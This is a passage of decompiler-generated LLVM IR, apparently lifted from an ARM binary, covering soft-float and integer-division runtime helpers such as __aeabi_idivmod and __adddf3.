  %v6_19e28 = icmp ult i32 %v1_19e2c, %v4_19e28
  br i1 %v6_19e28, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_19e2c = and i32 %v1_19e3c, 4
  %v4_19e2c = icmp eq i32 %v3_19e2c, 0
  %v6_19e2c = sub i32 %v1_19e2c, %v4_19e28
  br i1 %v4_19e2c, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_19e30 = udiv i32 %v1_19e38, 8
  %v6_19e30 = or i32 %v1_19e30, %v5_19e30
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_19e48 = phi i32 [ %v1_19e30, %bb97 ], [ %v1_19e30, %.thread10 ], [ %v6_19e30, %bb98 ]
  %v0_19e34 = phi i32 [ %v6_19e2c, %bb97 ], [ %v1_19e2c, %.thread10 ], [ %v6_19e2c, %bb98 ]
  %v2_19e34 = icmp eq i32 %v0_19e34, 0
  br i1 %v2_19e34, label %dec_label_pc_19e44, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_19e38, 16
  br i1 %tmp, label %dec_label_pc_19e44, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_19e38 = udiv i32 %v1_19e38, 16
  %v4_19e3c = udiv i32 %v1_19e3c, 16
  br label %dec_label_pc_19e04

dec_label_pc_19e44:                               ; preds = %thread-pre-split12, %bb99
  %v1_19e44 = icmp slt i32 %v2_19d9c, 0
  br i1 %v1_19e44, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_19e44
  %v2_19e48 = sub i32 0, %v1_19e48
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_19e50, %dec_label_pc_19e44, %bb100
  %v1_19e4c = phi i32 [ %v1_19e48, %dec_label_pc_19e44 ], [ %v2_19e48, %bb100 ], [ %v0_19d9c, %dec_label_pc_19e50 ], [ %v2_19e54, %bb101 ], [ %v1_19e6880, %bb103 ], [ %v2_19e64, %bb104 ]
  ret i32 %v1_19e4c

dec_label_pc_19e50:                               ; preds = %thread-pre-split
  br i1 %v1_19d98, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_19e50
  %v2_19e54 = sub i32 0, %v0_19d9c
  br label %.thread16

dec_label_pc_19e5c:                               ; preds = %bb86
  br i1 %v3_19db8, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_19e5c
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_19e5c, %bb102
  %v1_19e6880 = phi i32 [ %v0_19d9c, %dec_label_pc_19e5c ], [ 0, %bb102 ]
  br i1 %v9_19db8, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_19e60 = ashr i32 %v2_19d9c, 31
  %v2_19e64 = or i32 %v4_19e60, 1
  br label %.thread16

dec_label_pc_19e6c:                               ; preds = %dec_label_pc_19dc0
  %v2_19e6c = icmp ugt i32 %v1_19e70, 65535
  br i1 %v2_19e6c, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_19e6c
  %v2_19e70 = and i32 %v1_19e70, 32768
  %v3_19e70 = icmp eq i32 %v2_19e70, 0
  %v4_19e70 = udiv i32 %v1_19e70, 65536
  br i1 %v3_19e70, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_19e6c
  %v0_19e7c70 = phi i32 [ %v1_19e70, %dec_label_pc_19e6c ], [ %v4_19e70, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_19e80 = phi i32 [ %v0_19e7c70, %.thread19 ], [ %v4_19e70, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_19e7c = icmp ugt i32 %v1_19e80, 255
  br i1 %v2_19e7c, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_19e80 = and i32 %v1_19e80, 128
  %v3_19e80 = icmp eq i32 %v2_19e80, 0
  %v4_19e80 = udiv i32 %v1_19e80, 256
  br i1 %v3_19e80, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_19e84 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_19e90 = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_19e84, %bb108 ]
  %v1_19e8c = phi i32 [ %v1_19e80, %bb106 ], [ %v4_19e80, %bb107 ], [ %v4_19e80, %bb108 ]
  %v2_19e88 = icmp ugt i32 %v1_19e8c, 15
  br i1 %v2_19e88, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_19e8c = and i32 %v1_19e8c, 8
  %v3_19e8c = icmp eq i32 %v2_19e8c, 0
  %v4_19e8c = udiv i32 %v1_19e8c, 16
  br i1 %v3_19e8c, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_19e90 = add nsw i32 %v1_19e90, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_19e98 = phi i32 [ %v1_19e90, %.thread20 ], [ %v1_19e90, %bb109 ], [ %v2_19e90, %bb110 ]
  %v5_19e9c = phi i32 [ %v1_19e8c, %.thread20 ], [ %v4_19e8c, %bb109 ], [ %v4_19e8c, %bb110 ]
  %v2_19e94 = icmp ugt i32 %v5_19e9c, 3
  %v7_19e94 = icmp eq i32 %v5_19e9c, 4
  %v2_19e98 = xor i1 %v7_19e94, true
  %v3_19e98 = and i1 %v2_19e94, %v2_19e98
  br i1 %v3_19e98, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_19e98 = add nsw i32 %v4_19e98, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_19e9c = phi i32 [ %v4_19e98, %.thread21 ], [ %v5_19e98, %bb111 ]
  %v2_19e9c = xor i1 %v2_19e94, true
  %v3_19e9c = or i1 %v7_19e94, %v2_19e9c
  br i1 %v3_19e9c, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_19e9c = udiv i32 %v5_19e9c, 2
  %v9_19e9c = add i32 %v4_19e9c, %v8_19e9c
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_19ea4 = phi i32 [ %v4_19e9c, %bb112 ], [ %v9_19e9c, %bb113 ]
  %v1_19ea0 = icmp slt i32 %v2_19d9c, 0
  %v6_19ea4 = lshr i32 %v0_19ea4, %v1_19ea4
  %v2_19ea8 = sub i32 0, %v6_19ea4
  %v2_19ea8.v6_19ea4 = select i1 %v1_19ea0, i32 %v2_19ea8, i32 %v6_19ea4
  ret i32 %v2_19ea8.v6_19ea4

dec_label_pc_19eb0:                               ; preds = %entry
  %v0_19eb0 = load i32, i32* @lr, align 4
  %v0_19eb4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_19eb0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_19e9c, { 1, 0 }
  uselistorder i1 %v7_19e94, { 1, 0 }
  uselistorder i32 %v4_19e8c, { 1, 0 }
  uselistorder i32 %v1_19e8c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_19e80, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_19e80, { 1, 0, 2, 3 }
  uselistorder i32 %v4_19e70, { 1, 0 }
  uselistorder i32 %v0_19e34, { 1, 0 }
  uselistorder i32 %v4_19e28, { 1, 0 }
  uselistorder i32 %v1_19e30, { 1, 2, 0 }
  uselistorder i32 %v4_19e1c, { 1, 0 }
  uselistorder i32 %v1_19e24, { 1, 2, 0 }
  uselistorder i32 %v4_19e10, { 1, 0 }
  uselistorder i32 %v1_19e18, { 1, 2, 0 }
  uselistorder i32 %v1_19e3c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_19e0c, { 1, 0 }
  uselistorder i32 %v1_19e38, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_19df8, { 1, 0 }
  uselistorder i32 %v3_19df4, { 1, 0 }
  uselistorder i32 %v1_19df4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_19df0, { 1, 0 }
  uselistorder i32 %v1_19df8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19de4, { 1, 0 }
  uselistorder i32 %v4_19de0, { 2, 1, 0 }
  uselistorder i32 %v1_19de4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_19dec.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_19db8, { 1, 0 }
  uselistorder i32 %v1_19e70, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_19d9c, { 1, 0, 2 }
  uselistorder i32 %v0_19d9c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_19e44, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_19e00, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19decthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_19ec4 = sdiv i32 %arg1, %arg2
  ret i32 %v2_19ec4
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_19ed8 = sub i32 0, %arg1
  %v2_19ed8 = sext i32 %v1_19ed8 to i64
  %v3_19edc = bitcast i64 %v2_19ed8 to double
  %v9_19edc = fadd double %v3_19edc, %arg2
  %v10_19edc = fptrunc double %v9_19edc to float
  %v11_19edc = bitcast float %v10_19edc to i32
  ret i32 %v11_19edc
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_19ee0 = load i32, i32* @r0, align 4
  ret i32 %v2_19ee0
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19ee4 = load i32, i32* @r4, align 4
  store i32 %v3_19ee4, i32* %stack_var_-12, align 4
  %v6_19ee4 = load i32, i32* @r5, align 4
  %v0_19ee8 = load i32, i32* %r0.global-to-local, align 4
  %v2_19ee8 = mul i32 %v0_19ee8, 2
  store i32 %v2_19ee8, i32* %r4.global-to-local, align 4
  %v0_19eec = load i32, i32* %r2.global-to-local, align 4
  %v2_19eec = mul i32 %v0_19eec, 2
  store i32 %v2_19eec, i32* %r5.global-to-local, align 4
  %v4_19ef0 = icmp eq i32 %v2_19eec, %v2_19ee8
  %v1_19ef4 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_19ef0, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_19ef4 = load i32, i32* %r3.global-to-local, align 4
  %v5_19ef4 = icmp eq i32 %v2_19ef4, %v1_19ef4
  br i1 %v5_19ef4, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_19ef8 = or i32 %v1_19ef4, %v2_19ee8
  %v5_19ef8 = icmp eq i32 %v3_19ef8, 0
  br i1 %v5_19ef8, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_19efc = load i32, i32* %r3.global-to-local, align 4
  %v3_19efc = or i32 %v2_19efc, %v2_19eec
  %v5_19efc = icmp eq i32 %v3_19efc, 0
  br i1 %v5_19efc, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_19ee8.off = add i32 %v2_19ee8, 4194303
  %tmp = icmp ult i32 %v2_19ee8.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_19eec.off = add i32 %v2_19eec, 4194303
  %tmp18 = icmp ult i32 %v2_19eec.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_19f08 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_19f08, i32 ptrtoint (i32* @global_var_1a128.1360 to i32))
  %v0_19f0c = load i32, i32* %r4.global-to-local, align 4
  %v3_19f0c = udiv i32 %v0_19f0c, 2097152
  store i32 %v3_19f0c, i32* %r4.global-to-local, align 4
  %v1_19f10 = load i32, i32* %r5.global-to-local, align 4
  %v4_19f10 = udiv i32 %v1_19f10, 2097152
  %v5_19f10 = sub nsw i32 %v4_19f10, %v3_19f0c
  %v5_19f14 = icmp ult i32 %v4_19f10, %v3_19f0c
  br i1 %v5_19f14, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_19f14 = sub nsw i32 0, %v5_19f10
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_19f14, %bb14 ], [ %v5_19f10, %.thread3 ]
  %v1_19f74 = phi i32 [ %v7_19f14, %bb14 ], [ %v5_19f10, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_19f18 = icmp ugt i32 %v4_19f10, %v3_19f0c
  br i1 %v7_19f18, label %dec_label_pc_19f1c, label %dec_label_pc_19f38

dec_label_pc_19f1c:                               ; preds = %bb15
  %v2_19f1c = add nsw i32 %v1_19f74, %v3_19f0c
  store i32 %v2_19f1c, i32* %r4.global-to-local, align 4
  %v0_19f20 = load i32, i32* %r1.global-to-local, align 4
  %v1_19f20 = load i32, i32* %r3.global-to-local, align 4
  %v0_19f24 = load i32, i32* %r0.global-to-local, align 4
  %v1_19f24 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_19f20, i32* %r1.global-to-local, align 4
  store i32 %v1_19f24, i32* %r0.global-to-local, align 4
  store i32 %v0_19f20, i32* %r3.global-to-local, align 4
  store i32 %v0_19f24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19f38

dec_label_pc_19f38:                               ; preds = %bb15, %dec_label_pc_19f1c
  %v0_19f74 = phi i32 [ %v3_19f0c, %bb15 ], [ %v2_19f1c, %dec_label_pc_19f1c ]
  %tmp19 = icmp ugt i32 %v1_19f74, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_19f38
  %v6_19f3c = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_19f3c, i32* %r4.global-to-local, align 4
  store i32 %v6_19ee4, i32* %r5.global-to-local, align 4
  %v15_19f3c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_19f3c

bb17:                                             ; preds = %dec_label_pc_19f38
  %v0_19f40 = load i32, i32* %r0.global-to-local, align 4
  %v3_19f40 = icmp sgt i32 %v0_19f40, -1
  %v4_19f4c = urem i32 %v0_19f40, 1048576
  %v5_19f4c = or i32 %v4_19f4c, 1048576
  store i32 %v5_19f4c, i32* %r0.global-to-local, align 4
  br i1 %v3_19f40, label %dec_label_pc_19f5c, label %dec_label_pc_19f54

dec_label_pc_19f54:                               ; preds = %bb17
  %v0_19f54 = load i32, i32* %r1.global-to-local, align 4
  %v1_19f54 = sub i32 0, %v0_19f54
  store i32 %v1_19f54, i32* %r1.global-to-local, align 4
  %v2_19f54 = icmp eq i32 %v0_19f54, 0
  %v2_19f58 = icmp eq i1 %v2_19f54, false
  %v5_19f58 = sext i1 %v2_19f58 to i32
  %v6_19f58 = sub nsw i32 %v5_19f58, %v5_19f4c
  store i32 %v6_19f58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19f5c

dec_label_pc_19f5c:                               ; preds = %bb17, %dec_label_pc_19f54
  %v0_19f5c = load i32, i32* %r2.global-to-local, align 4
  %v3_19f5c = icmp sgt i32 %v0_19f5c, -1
  %v4_19f64 = urem i32 %v0_19f5c, 1048576
  %v5_19f64 = or i32 %v4_19f64, 1048576
  store i32 %v5_19f64, i32* %r2.global-to-local, align 4
  br i1 %v3_19f5c, label %dec_label_pc_19f74, label %dec_label_pc_19f6c

dec_label_pc_19f6c:                               ; preds = %dec_label_pc_19f5c
  %v0_19f6c = load i32, i32* %r3.global-to-local, align 4
  %v1_19f6c = sub i32 0, %v0_19f6c
  store i32 %v1_19f6c, i32* %r3.global-to-local, align 4
  %v2_19f6c = icmp eq i32 %v0_19f6c, 0
  %v2_19f70 = icmp eq i1 %v2_19f6c, false
  %v5_19f70 = sext i1 %v2_19f70 to i32
  %v6_19f70 = sub nsw i32 %v5_19f70, %v5_19f64
  store i32 %v6_19f70, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19f74

dec_label_pc_19f74:                               ; preds = %dec_label_pc_19f5c, %dec_label_pc_19f6c
  %v4_19f74 = icmp eq i32 %v0_19f74, %v1_19f74
  call void @__pseudo_cond_branch(i1 %v4_19f74, i32 ptrtoint (i32* @global_var_1a110.1361 to i32))
  %v1_19f78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_19f78

; uselistorder directives
  uselistorder i32 %v0_19f5c, { 1, 0 }
  uselistorder i32 %v0_19f40, { 1, 0 }
  uselistorder i32 %v4_19f10, { 2, 1, 0 }
  uselistorder i32 %v3_19f0c, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_19ef4, { 1, 0 }
  uselistorder i32 %v2_19eec, { 1, 3, 0, 2 }
  uselistorder i32 %v2_19ee8, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_19f74, { 1, 0 }
  uselistorder label %dec_label_pc_19f5c, { 1, 0 }
  uselistorder label %dec_label_pc_19f38, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_19f7c() local_unnamed_addr {
dec_label_pc_19f7c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_19f7c = load i32, i32* @r4, align 4
  %v1_19f7c = add i32 %v0_19f7c, -1
  store i32 %v1_19f7c, i32* @r4, align 4
  %v0_19f80 = load i32, i32* @r5, align 4
  %v1_19f80 = sub i32 32, %v0_19f80
  %v5_19f84 = icmp sgt i32 %v0_19f80, 32
  br i1 %v5_19f84, label %dec_label_pc_19fa0, label %dec_label_pc_19f88

dec_label_pc_19f88:                               ; preds = %dec_label_pc_19f7c
  %v0_19f88 = load i32, i32* @r3, align 4
  %v6_19f88 = shl i32 %v0_19f88, %v1_19f80
  store i32 %v6_19f88, i32* %ip.global-to-local, align 4
  %v0_19f8c = load i32, i32* @r1, align 4
  %v3_19f8c = add i32 %v0_19f80, -1
  %v4_19f8c = shl i32 1, %v3_19f8c
  %v7_19f8c = lshr i32 %v0_19f88, %v0_19f80
  %v8_19f8c = add i32 %v0_19f8c, %v7_19f8c
  %v9_19f8c = icmp ult i32 %v8_19f8c, %v0_19f8c
  %v0_19f90 = load i32, i32* @r0, align 4
  %v2_19f90 = zext i1 %v9_19f8c to i32
  %v3_19f90 = add i32 %v2_19f90, %v0_19f90
  %v1_19f94 = load i32, i32* @r2, align 4
  %v7_19f94 = shl i32 %v1_19f94, %v1_19f80
  %v8_19f94 = add i32 %v7_19f94, %v8_19f8c
  store i32 %v8_19f94, i32* %r1.global-to-local, align 4
  %v5_19f98 = and i32 %v1_19f94, %v4_19f8c
  %v6_19f98 = icmp ne i32 %v5_19f98, 0
  %v7_19f98 = ashr i32 %v1_19f94, %v0_19f80
  %v9_19f98 = add i32 %v3_19f90, %v7_19f98
  %v10_19f98 = zext i1 %v6_19f98 to i32
  %v11_19f98 = add i32 %v10_19f98, %v9_19f98
  br label %dec_label_pc_19fbc

dec_label_pc_19fa0:                               ; preds = %dec_label_pc_19f7c
  %v1_19fa0 = add i32 %v0_19f80, -32
  %v1_19fa4 = add i32 %v1_19f80, 32
  %v0_19fac = load i32, i32* @r2, align 4
  %v2_19fac = add i32 %v1_19f80, 31
  %v3_19fac = lshr i32 -2147483648, %v2_19fac
  %v4_19fac = and i32 %v0_19fac, %v3_19fac
  %v5_19fac = icmp ne i32 %v4_19fac, 0
  %v6_19fac = shl i32 %v0_19fac, %v1_19fa4
  %v2_19fb0 = or i32 %v6_19fac, 2
  %v2_19fb0.v6_19fac = select i1 %v5_19fac, i32 %v2_19fb0, i32 %v6_19fac
  store i32 %v2_19fb0.v6_19fac, i32* %ip.global-to-local, align 4
  %v0_19fb4 = load i32, i32* @r1, align 4
  %v7_19fb4 = ashr i32 %v0_19fac, %v1_19fa0
  %v8_19fb4 = add i32 %v0_19fb4, %v7_19fb4
  store i32 %v8_19fb4, i32* %r1.global-to-local, align 4
  %v0_19fb8 = load i32, i32* @r0, align 4
  %v2_19fb8 = and i32 %v0_19fac, 1073741824
  %v3_19fb8 = icmp ne i32 %v2_19fb8, 0
  %v4_19fb8 = ashr i32 %v0_19fac, 31
  %v6_19fb8 = add i32 %v0_19fb8, %v4_19fb8
  %v7_19fb8 = zext i1 %v3_19fb8 to i32
  %v8_19fb8 = add i32 %v6_19fb8, %v7_19fb8
  br label %dec_label_pc_19fbc

dec_label_pc_19fbc:                               ; preds = %dec_label_pc_19f88, %dec_label_pc_19fa0
  %storemerge = phi i32 [ %v11_19f98, %dec_label_pc_19f88 ], [ %v8_19fb8, %dec_label_pc_19fa0 ]
  %v0_19fbc = phi i32 [ %v11_19f98, %dec_label_pc_19f88 ], [ %v8_19fb8, %dec_label_pc_19fa0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_19fbc = and i32 %v0_19fbc, -2147483648
  store i32 %v1_19fbc, i32* @r5, align 4
  %v1_19fc0 = icmp sgt i32 %v0_19fbc, -1
  call void @__pseudo_cond_branch(i1 %v1_19fc0, i32 ptrtoint (i32* @global_var_19fd0.1362 to i32))
  %v0_19fc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_19fc4 = sub i32 0, %v0_19fc4
  store i32 %v1_19fc4, i32* %ip.global-to-local, align 4
  %v2_19fc4 = icmp eq i32 %v0_19fc4, 0
  %v0_19fc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_19fc8 = icmp eq i1 %v2_19fc4, false
  %v5_19fc8 = sext i1 %v2_19fc8 to i32
  %v6_19fc8 = sub i32 %v5_19fc8, %v0_19fc8
  store i32 %v6_19fc8, i32* @r1, align 4
  %v7_19fc8 = zext i1 %v2_19fc8 to i32
  %v8_19fc8 = icmp ne i32 %v6_19fc8, %v7_19fc8
  %v9_19fc8 = icmp ne i32 %v0_19fc8, -1
  %v10_19fc8 = or i1 %v9_19fc8, %v8_19fc8
  %v11_19fc8 = icmp ne i32 %v0_19fc8, 0
  %v12_19fc8 = select i1 %v2_19fc8, i1 %v10_19fc8, i1 %v11_19fc8
  %v0_19fcc = load i32, i32* %r0.global-to-local, align 4
  %v5_19fcc = sext i1 %v12_19fc8 to i32
  %v6_19fcc = sub i32 %v5_19fcc, %v0_19fcc
  store i32 %v6_19fcc, i32* %r0.global-to-local, align 4
  ret i32 %v6_19fcc

; uselistorder directives
  uselistorder i1 %v2_19fc8, { 1, 2, 0 }
  uselistorder i32 %v0_19fc8, { 1, 2, 0 }
  uselistorder i32 %v8_19fb8, { 1, 0 }
  uselistorder i32 %v0_19fac, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_19f98, { 1, 0 }
  uselistorder i32 %v1_19f94, { 1, 0, 2 }
  uselistorder i32 %v0_19f8c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_19fbc, { 1, 0 }
}

define i32 @function_19fd0(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_19fd0:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_19fd4 = icmp ult i32 %arg1, 1048574
  br i1 %v3_19fd4, label %dec_label_pc_1a014, label %dec_label_pc_19fd8

dec_label_pc_19fd8:                               ; preds = %dec_label_pc_19fd0
  %v3_19fdc = icmp ult i32 %arg1, 2097150
  br i1 %v3_19fdc, label %dec_label_pc_19ffc, label %dec_label_pc_19fe0

dec_label_pc_19fe0:                               ; preds = %dec_label_pc_19fd8
  %v1_19fe0 = urem i32 %arg1, 2
  %v2_19fe0 = icmp ne i32 %v1_19fe0, 0
  %v3_19fe0 = udiv i32 %arg1, 2
  store i32 %v3_19fe0, i32* %r0.global-to-local, align 4
  %v0_19fe4 = load i32, i32* %r1.global-to-local, align 4
  %v3_19fe4 = zext i1 %v2_19fe0 to i32
  %v6_19fe4 = zext i32 %v0_19fe4 to i64
  %v7_19fe4 = sub i32 33, %v0_19fe4
  %v8_19fe4 = zext i32 %v7_19fe4 to i64
  %v9_19fe4 = shl i64 %v6_19fe4, %v8_19fe4
  %v10_19fe4 = sub i32 32, %v0_19fe4
  %v11_19fe4 = shl i32 %v3_19fe4, %v10_19fe4
  %v12_19fe4 = zext i32 %v11_19fe4 to i64
  %v14_19fe4 = or i64 %v12_19fe4, %v9_19fe4
  %v15_19fe4 = trunc i64 %v14_19fe4 to i32
  %v16_19fe4 = add i32 %v0_19fe4, -1
  %v17_19fe4 = shl i32 1, %v16_19fe4
  %v18_19fe4 = and i32 %v17_19fe4, %v0_19fe4
  %v19_19fe4 = icmp ne i32 %v18_19fe4, 0
  store i32 %v15_19fe4, i32* %r1.global-to-local, align 4
  %v0_19fe8 = load i32, i32* @ip, align 4
  %v3_19fe8 = zext i1 %v19_19fe4 to i32
  %v6_19fe8 = zext i32 %v0_19fe8 to i64
  %v7_19fe8 = sub i32 33, %v0_19fe8
  %v8_19fe8 = zext i32 %v7_19fe8 to i64
  %v9_19fe8 = shl i64 %v6_19fe8, %v8_19fe8
  %v10_19fe8 = sub i32 32, %v0_19fe8
  %v11_19fe8 = shl i32 %v3_19fe8, %v10_19fe8
  %v12_19fe8 = zext i32 %v11_19fe8 to i64
  %v14_19fe8 = or i64 %v12_19fe8, %v9_19fe8
  %v15_19fe8 = trunc i64 %v14_19fe8 to i32
  store i32 %v15_19fe8, i32* @ip, align 4
  %v0_19fec = load i32, i32* @r4, align 4
  %v1_19fec = add i32 %v0_19fec, 1
  store i32 %v1_19fec, i32* @r4, align 4
  %v3_19ff0 = mul i32 %v1_19fec, 2097152
  %v2_19ff4 = icmp ugt i32 %v3_19ff0, -4194305
  call void @__pseudo_cond_branch(i1 %v2_19ff4, i32 ptrtoint (i32* @global_var_1a188.1363 to i32))
  br label %dec_label_pc_19ffc

dec_label_pc_19ffc:                               ; preds = %dec_label_pc_1a014, %dec_label_pc_19fd8, %dec_label_pc_19fe0
  %v0_19ffc = load i32, i32* @ip, align 4
  %v2_19ffc = icmp slt i32 %v0_19ffc, 0
  %v6_19ffc = icmp eq i32 %v0_19ffc, -2147483648
  %v1_1a000 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_19ffc, label %bb, label %dec_label_pc_19ffc._crit_edge

bb:                                               ; preds = %dec_label_pc_19ffc
  %v2_1a000 = urem i32 %v1_1a000, 2
  %v3_1a000 = icmp ne i32 %v2_1a000, 0
  br label %dec_label_pc_19ffc._crit_edge

dec_label_pc_19ffc._crit_edge:                    ; preds = %dec_label_pc_19ffc, %bb
  %v1_1a004 = phi i1 [ %v3_1a000, %bb ], [ %v2_19ffc, %dec_label_pc_19ffc ]
  %v2_1a004 = zext i1 %v1_1a004 to i32
  %v3_1a004 = add i32 %v2_1a004, %v1_1a000
  store i32 %v3_1a004, i32* %r1.global-to-local, align 4
  %v0_1a008 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a008 = load i32, i32* @r4, align 4
  %v2_1a008 = and i32 %v1_1a008, 4096
  %v3_1a008 = icmp ne i32 %v2_1a008, 0
  %v4_1a008 = mul i32 %v1_1a008, 1048576
  %v6_1a008 = add i32 %v4_1a008, %v0_1a008
